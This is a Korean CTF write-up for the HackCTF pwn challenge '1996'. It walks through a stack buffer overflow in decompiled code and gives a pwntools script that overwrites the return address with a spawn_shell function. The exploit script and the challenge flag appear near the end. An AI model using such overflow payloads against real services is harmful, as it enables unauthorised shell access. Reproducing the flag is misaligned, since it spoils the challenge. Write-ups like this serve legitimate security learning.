@@ -1,0 +1,83 @@
+1996 풀이
+
+
+보호기법을 살펴보면
+
+NX만 걸려있으므로 쉘코드 사용이 불가능하고 그외의 기법들은 사용이 가능할것같다.
+
+NX(스택,힙에 대한 실행 권한)
+
+
+IDA 코드
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rdx
+  __int64 v4; // rax
+  __int64 v5; // rdx
+  __int64 v6; // rbx
+  char *v7; // rax
+  __int64 v8; // rdx
+  __int64 v9; // rax
+  char name; // [rsp+0h] [rbp-410h]
+
+  std::operator<<<std::char_traits<char>>(&_bss_start, "Which environment variable do you want to read? ", envp);
+  std::operator>><char,std::char_traits<char>>(&std::cin, &name);
+  v4 = std::operator<<<std::char_traits<char>>(&_bss_start, &name, v3);
+  v6 = std::operator<<<std::char_traits<char>>(v4, "=", v5);
+  v7 = getenv(&name);
+  v9 = std::operator<<<std::char_traits<char>>(v6, v7, v8);
+  std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
+  return 0;
+}
+
+
+코드를보면 name 쪽에 getenv 로 name 이 들어가는데
+정확한 바이트수가 정해진것이 아니기떄문에 BOF 취약점이 발생한다.
+
+따라서 name 까지의 거리 를 구하고 
+
+IDA 의 함수 주소를보면 spawn_shell(void) 라는
+
+int spawn_shell(void)
+{
+  char *argv; // [rsp+0h] [rbp-10h]
+  __int64 v2; // [rsp+8h] [rbp-8h]
+
+  argv = "/bin/bash";
+  v2 = 0LL;
+  return execve("/bin/bash", &argv, 0LL);
+}
+
+함수가 있는데 이함수는 bin/bash 를 실행시키는 함수이기때문에 버퍼오버플로우를 일으키고
+이함수를 get overwrite 나 return address 를 바꿔주면 된다.
+
+따라서 name 까지의 거리는 410 이므로
+64비트 STP 는 8바이트
+
+410은 10진수로 1040 STP 까지 합하면 1048
+
+따라서 페이로드를 작성하자한다면
+
+1048+ shell 이다.
+
+페이로드.py
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3013)
+
+shell = 0x0000000000400897
+
+payload = "A"*1048
+payload += p64(shell)
+
+
+p.recvuntil('Which environment variable do you want to read?')
+p.sendline(payload)
+p.interactive()
+
+
+컴파일 하면 페이로드가 나온다.
+
+HackCTF{b29a2800780d85cfc346}
